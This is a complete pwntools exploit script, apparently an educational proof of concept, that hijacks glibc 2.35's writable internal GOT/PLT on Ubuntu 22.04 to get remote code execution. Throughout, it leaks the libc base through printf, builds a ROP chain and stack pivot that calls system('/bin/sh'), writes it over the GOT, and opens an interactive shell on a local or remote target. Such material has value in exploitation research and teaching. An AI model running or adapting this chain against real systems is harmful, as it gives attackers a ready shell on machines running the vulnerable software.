# Title       : PoC for Hijacking glibc internal GOT/PLT to RCE
# Author      : Axura
# Target      : GLIBC 2.35-0ubuntu3.4 (Ubuntu 22.04)
# Website     : https://4xura.com/pwn/pwn-got-hijack-libcs-internal-got-plt-as-rce-primitives/
# Vuln script : https://github.com/4xura/pwn-libc-got/blob/main/demo/vuln.c
# Tags        : PLT0, GOT0, writable _GLOBAL_OFFSET_TABLE_, ROP, system


import sys
import inspect
from pwn import *


s       = lambda data                 :p.send(data)
sa      = lambda delim,data           :p.sendafter(delim, data)
sl      = lambda data                 :p.sendline(data)
sla     = lambda delim,data           :p.sendlineafter(delim, data)
r       = lambda num=4096             :p.recv(num)
ru      = lambda delim, drop=True     :p.recvuntil(delim, drop)
l64     = lambda                      :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu64    = lambda data                 :u64(data.ljust(8, b"\0"))


def g(gdbscript: str = ""):
    if mode["local"]:
        gdb.attach(p, gdbscript=gdbscript)
        
    elif mode["remote"]:
        gdb.attach((remote_ip_addr, remote_port), gdbscript)
        if gdbscript == "":
            raw_input()


def pa(addr: int) -> None:
    frame = inspect.currentframe().f_back
    variables = {k: v for k, v in frame.f_locals.items() if v is addr}
    desc = next(iter(variables.keys()), "unknown")
    success(f"[LEAK] {desc} ---> {addr:#x}")


class ROPGadgets:
    def __init__(self, libc: ELF): 
        self.rop = ROP(libc)
        self.addr = lambda x: self.rop.find_gadget(x)[0] if self.rop.find_gadget(x) else None

        self.ggs = {
            'p_rdi_r'       : self.addr(['pop rdi', 'ret']),
            'p_rsi_r'       : self.addr(['pop rsi', 'ret']),
            'p_rdx_rbx_r'   : self.addr(['pop rdx', 'pop rbx', 'ret']),
            'p_rax_r'       : self.addr(['pop rax', 'ret']),
            'p_rsp_r'       : self.addr(['pop rsp', 'ret']),
            'leave_r'       : self.addr(['leave', 'ret']),
            'ret'           : self.addr(['ret']),
            'syscall_r'     : self.addr(['syscall', 'ret']),
        }

    def __getitem__(self, k: str) -> int:
        return self.ggs.get(k)


def rop(libc: ELF, rop_chain, pivot) -> (int, bytes):
    """GOT+16 stack pivot to GOT+8 (pushed)"""
    global GOT_ET_COUNT

    got0 = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    pa(got0)
    pa(plt0)

    write_dest = got0 + 8
    rop_dest = write_dest + 0x10 + GOT_ET_COUNT * 8

    write_data = flat(
        rop_dest,
        pivot,
        [plt0] * GOT_ET_COUNT,
        rop_chain,
    )

    return write_dest, write_data


def exp():
    """
    11ee:       e8 5d fe ff ff          call   1050 <printf@plt>
    """
    # g("breakrva 0x11ee")

    leak = int(ru(b"\n"), 16)
    libc_base = leak - libc.sym.printf
    pa(libc_base)
    libc.address = libc_base

    ggs = ROPGadgets(libc)
    p_rdi_r = ggs["p_rdi_r"]
    p_rax_r = ggs["p_rax_r"]
    # 0x000000000002d543: pop rsp; pop r13; pop r14; pop r15; jmp rax;
    p_rsp_jmp_rax = libc.address + 0x2d543

    safe_rsp = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT") \
            + 0x3000
    pa(safe_rsp)

    rop_chain = flat(
            p_rdi_r,
            libc.search(b"/bin/sh\x00").__next__(),
            p_rax_r,
            libc.sym.system,
            p_rsp_jmp_rax,
            safe_rsp,
            )

    pivot = ggs["p_rsp_r"]

    write_dest, write_data = rop(
            libc,
            rop_chain,
            pivot
            )

    s(p64(write_dest))
    s(p64(len(write_data)))
    s(write_data)

    success("Payload written to: {}\nPayload length: {}".format(hex(write_dest), hex(len(write_data))))

    # pause()
    p.interactive()


if __name__ == '__main__':
    """pwndbg> tel &_GLOBAL_OFFSET_TABLE_ 60
    00:0000│  0x7ffff7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc0
    01:0008│  0x7ffff7fa7008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7fbb160 —▸ 0x7ffff7d8e000 ◂— 0x3010102464c457f
    02:0010│  0x7ffff7fa7010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fd8d30 (_dl_runtime_resolve_xsavec) ◂— endbr64
    03:0018│  0x7ffff7fa7018 (*ABS*@got.plt) —▸ 0x7ffff7f2bb60 (__strnlen_avx2) ◂— endbr64
    04:0020│  0x7ffff7fa7020 (*ABS*@got.plt) —▸ 0x7ffff7f27790 (__rawmemchr_avx2) ◂— endbr64
    [...]
    37:01b8│  0x7ffff7fa71b8 (_dl_audit_preinit@got.plt) —▸ 0x7ffff7fde660 (_dl_audit_preinit) ◂— endbr64
    38:01c0│  0x7ffff7fa71c0 (*ABS*@got.plt) —▸ 0x7ffff7f2bb60 (__strnlen_avx2) ◂— endbr64
    39:01c8│  0x7ffff7fa71c8 ◂— 0x0
    3a:01d0│  0x7ffff7fa71d0 ◂— 0x0"""
    GOT_ET_COUNT = 0x36

    FILE_PATH = "./vuln"
    LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"

    context(arch="amd64", os="linux", endian="little")
    context.log_level = "debug"
    context.terminal  = ['tmux', 'splitw', '-h']    # ['<terminal_emulator>', '-e', ...]

    e    = ELF(FILE_PATH, checksec=False)
    mode = {"local": False, "remote": False, }
    env  = None

    print("Usage: python3 xpl.py [<ip> <port>]\n"
                "  - If no arguments are provided, runs in local mode (default).\n"
                "  - Provide <ip> and <port> to target a remote host.\n")

    if len(sys.argv) == 3:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
        p = remote(sys.argv[1], int(sys.argv[2]))
        mode["remote"] = True
        remote_ip_addr = sys.argv[1]
        remote_port    = int(sys.argv[2])
        
    elif len(sys.argv) == 1:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
            env = {
                "LD_PRELOAD": os.path.abspath(LIBC_PATH),
                "LD_LIBRARY_PATH": os.path.dirname(os.path.abspath(LIBC_PATH))
            }
        p   = process(FILE_PATH, env=env)
        mode["local"] = True
    else:
        print("[-] Error: Invalid arguments provided.")
        sys.exit(1)

    exp()
